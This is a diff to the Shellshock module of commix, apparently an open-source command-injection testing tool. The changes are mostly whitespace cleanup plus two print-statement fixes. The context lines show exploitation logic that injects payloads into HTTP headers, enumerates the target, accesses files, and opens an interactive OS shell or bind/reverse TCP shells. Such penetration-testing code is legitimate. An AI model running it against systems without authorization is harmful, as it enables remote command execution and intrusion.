@@ -97,14 +97,14 @@ def enumeration(url, cve, check_header, filename):
       info_msg = "The hostname is " +  str(shell)
       sys.stdout.write(settings.print_bold_info_msg(info_msg) + ".\n")
       sys.stdout.flush()
-      # Add infos to logs file. 
+      # Add infos to logs file.
       output_file = open(filename, "a")
       info_msg = "The hostname is " + str(shell) + ".\n"
       output_file.write(re.compile(re.compile(settings.ANSI_COLOR_REMOVAL)).sub("",settings.INFO_BOLD_SIGN) + info_msg)
       output_file.close()
     else:
       warn_msg = "Heuristics have failed to identify the hostname."
-      print(settings.print_warning_msg(warn_msg)) 
+      print(settings.print_warning_msg(warn_msg))
     settings.ENUMERATION_DONE = True
 
   #-------------------------------
@@ -528,7 +528,7 @@ def bind_tcp_config(url, cmd, cve, check_header, filename, os_shell_option, http
     if settings.RHOST and settings.LPORT in settings.SHELL_OPTIONS:
       result = checks.check_bind_tcp_options(settings.RHOST)
 
-    else:  
+    else:
       cmd = bind_tcp.bind_tcp_options(separator = "")
       result = checks.check_bind_tcp_options(cmd)
     if result != None:
@@ -539,7 +539,7 @@ def bind_tcp_config(url, cmd, cve, check_header, filename, os_shell_option, http
         settings.BIND_TCP = False
       return go_back, go_back_again
 
-    # execute bind TCP shell 
+    # execute bind TCP shell
     execute_shell(url, cmd, cve, check_header, filename, os_shell_option)
 
 """
@@ -560,7 +560,7 @@ def reverse_tcp_config(url, cmd, cve, check_header, filename, os_shell_option, h
   while True:
     if settings.LHOST and settings.LPORT in settings.SHELL_OPTIONS:
       result = checks.check_reverse_tcp_options(settings.LHOST)
-    else:  
+    else:
       cmd = reverse_tcp.reverse_tcp_options(separator = "")
       result = checks.check_reverse_tcp_options(cmd)
     if result != None:
@@ -571,7 +571,7 @@ def reverse_tcp_config(url, cmd, cve, check_header, filename, os_shell_option, h
         settings.REVERSE_TCP = False
       return go_back, go_back_again
 
-    # execute bind TCP shell 
+    # execute bind TCP shell
     execute_shell(url, cmd, cve, check_header, filename, os_shell_option)
 
 """
@@ -583,7 +583,7 @@ def check_options(url, cmd, cve, check_header, filename, os_shell_option, http_r
     if no_result == True:
       return False
     else:
-      return True 
+      return True
 
   # The "back" option
   elif os_shell_option == "back":
@@ -591,7 +591,7 @@ def check_options(url, cmd, cve, check_header, filename, os_shell_option, http_r
     return go_back, go_back_again
 
   # The "os_shell" option
-  elif os_shell_option == "os_shell": 
+  elif os_shell_option == "os_shell":
     warn_msg = "You are already into the '" + os_shell_option + "' mode."
     print(settings.print_warning_msg(warn_msg))+ "\n"
 
@@ -606,7 +606,7 @@ def check_options(url, cmd, cve, check_header, filename, os_shell_option, http_r
     return go_back, go_back_again
 
   # The "quit" option
-  elif os_shell_option == "quit":                    
+  elif os_shell_option == "quit":
     raise SystemExit()
 
 """
@@ -628,7 +628,7 @@ def shellshock_handler(url, http_request_method, filename):
   sys.stdout.write(settings.print_info_msg(info_msg))
   sys.stdout.flush()
 
-  try: 
+  try:
     i = 0
     total = len(shellshock_cves) * len(headers)
     for cve in shellshock_cves:
@@ -653,7 +653,7 @@ def shellshock_handler(url, http_request_method, filename):
         if check_header == "User-Agent":
           menu.options.agent = payload
         else:
-          menu.options.agent = default_user_agent  
+          menu.options.agent = default_user_agent
         log_http_headers.do_check(request)
         log_http_headers.check_http_traffic(request)
         # Check if defined any HTTP Proxy.
@@ -693,19 +693,19 @@ def shellshock_handler(url, http_request_method, filename):
           # Print the findings to log file.
           if export_injection_info == False:
             export_injection_info = logs.add_type_and_technique(export_injection_info, filename, injection_type, technique)
-          
+
           vuln_parameter = "HTTP Header"
           the_type = " " + vuln_parameter
           check_header = " " + check_header
           vp_flag = logs.add_parameter(vp_flag, filename, the_type, check_header, http_request_method, vuln_parameter, payload)
           check_header = check_header[1:]
-          logs.update_payload(filename, counter, payload) 
+          logs.update_payload(filename, counter, payload)
 
           if settings.VERBOSITY_LEVEL >= 1:
             checks.total_of_requests()
 
           info_msg = "The (" + check_header + ") '"
-          info_msg += url + Style.RESET_ALL + Style.BRIGHT 
+          info_msg += url + Style.RESET_ALL + Style.BRIGHT
           info_msg += "' seems vulnerable via " + technique + "."
           if settings.VERBOSITY_LEVEL <= 1:
             print("")
@@ -723,18 +723,18 @@ def shellshock_handler(url, http_request_method, filename):
                 enumerate_again = _input(settings.print_question_msg(question_msg))
 
               else:
-                 enumerate_again = "" 
+                 enumerate_again = ""
               if len(enumerate_again) == 0:
                  enumerate_again = "Y"
               if enumerate_again in settings.CHOICE_YES:
                 enumeration(url, cve, check_header, filename)
                 break
-              elif enumerate_again in settings.CHOICE_NO: 
+              elif enumerate_again in settings.CHOICE_NO:
                 break
               elif enumerate_again in settings.CHOICE_QUIT:
                 raise SystemExit()
               else:
-                err_msg = "'" + enumerate_again + "' is not a valid answer."  
+                err_msg = "'" + enumerate_again + "' is not a valid answer."
                 print(settings.print_error_msg(err_msg))
                 pass
           else:
@@ -747,27 +747,27 @@ def shellshock_handler(url, http_request_method, filename):
                 question_msg = "Do you want to access files again? [Y/n] > "
                 file_access_again = _input(settings.print_question_msg(question_msg))
               else:
-                 file_access_again= "" 
+                 file_access_again= ""
               if len(file_access_again) == 0:
                  file_access_again = "Y"
               if file_access_again in settings.CHOICE_YES:
                 file_access(url, cve, check_header, filename)
                 break
-              elif file_access_again in settings.CHOICE_NO: 
+              elif file_access_again in settings.CHOICE_NO:
                 break
               elif file_access_again in settings.CHOICE_QUIT:
                 raise SystemExit()
               else:
-                err_msg = "'" + file_access_again  + "' is not a valid answer."  
+                err_msg = "'" + file_access_again  + "' is not a valid answer."
                 print(settings.print_error_msg(err_msg))
                 pass
           else:
             file_access(url, cve, check_header, filename)
 
           if menu.options.os_cmd:
-            cmd = menu.options.os_cmd 
+            cmd = menu.options.os_cmd
             shell, payload = cmd_exec(url, cmd, cve, check_header, filename)
-            print("\n") + Fore.GREEN + Style.BRIGHT + shell + Style.RESET_ALL 
+            print("\n" + Fore.GREEN + Style.BRIGHT + shell + Style.RESET_ALL)
             raise SystemExit()
 
           else:
@@ -782,7 +782,7 @@ def shellshock_handler(url, http_request_method, filename):
                 question_msg = "Do you want a Pseudo-Terminal shell? [Y/n] > "
                 gotshell = _input(settings.print_question_msg(question_msg))
               else:
-                gotshell= ""  
+                gotshell= ""
               if len(gotshell) == 0:
                  gotshell= "Y"
               if gotshell in settings.CHOICE_YES:
@@ -804,14 +804,14 @@ def shellshock_handler(url, http_request_method, filename):
                         readline.parse_and_bind("tab: complete")
                     cmd = _input("""commix(""" + Style.BRIGHT + Fore.RED + """os_shell""" + Style.RESET_ALL + """) > """)
                     cmd = checks.escaped_cmd(cmd)
-                    
+
                     if cmd.lower() in settings.SHELL_OPTIONS:
                       os_shell_option = checks.check_os_shell_options(cmd.lower(), technique, go_back, no_result) 
                       go_back, go_back_again = check_options(url, cmd, cve, check_header, filename, os_shell_option, http_request_method, go_back, go_back_again)
 
                       if go_back:
                         break
-                    else: 
+                    else:
                       shell, payload = cmd_exec(url, cmd, cve, check_header, filename)
                       if shell != "":
                         # Update logs with executed cmds and execution results.
@@ -843,40 +843,40 @@ def shellshock_handler(url, http_request_method, filename):
 
                   except TypeError:
                     break
-                    
+
               elif gotshell in settings.CHOICE_NO:
                 if checks.next_attack_vector(technique, go_back) == True:
                   break
                 else:
                   if no_result == True:
-                    return False 
+                    return False
                   else:
-                    return True 
+                    return True
 
               elif gotshell in settings.CHOICE_QUIT:
                 raise SystemExit()
 
               else:
-                err_msg = "'" + gotshell + "' is not a valid answer."  
+                err_msg = "'" + gotshell + "' is not a valid answer."
                 print(settings.print_error_msg(err_msg))
                 continue
               break
         else:
           continue
-          
+
     if no_result:
       if settings.VERBOSITY_LEVEL != 2:
         print("")
       err_msg = "All tested HTTP headers appear to be not injectable."
       print(settings.print_critical_msg(err_msg))
       raise SystemExit()
-      
+
   except _urllib.error.HTTPError as err_msg:
     if str(err_msg.code) == settings.INTERNAL_SERVER_ERROR:
-      response = False  
+      response = False
     elif settings.IGNORE_ERR_MSG == False:
       err = str(err_msg) + "."
-      print("\n") + settings.print_critical_msg(err)
+      print("\n" + settings.print_critical_msg(err))
       continue_tests = checks.continue_tests(err_msg)
       if continue_tests == True:
         settings.IGNORE_ERR_MSG = True
@@ -893,13 +893,13 @@ def shellshock_handler(url, http_request_method, filename):
 
   except _http_client.IncompleteRead as err_msg:
     print(settings.print_critical_msg(err_msg + "."))
-    raise SystemExit()  
-    
+    raise SystemExit()
+
 """
 Execute user commands
 """
 def cmd_exec(url, cmd, cve, check_header, filename):
- 
+
   """
   Check for shellshock 'shell'
   """
@@ -959,7 +959,7 @@ def cmd_exec(url, cmd, cve, check_header, filename):
 The exploitation function.
 (call the injection handler)
 """
-def exploitation(url, http_request_method, filename):       
+def exploitation(url, http_request_method, filename):
   if shellshock_handler(url, http_request_method, filename) == False:
     return False
 
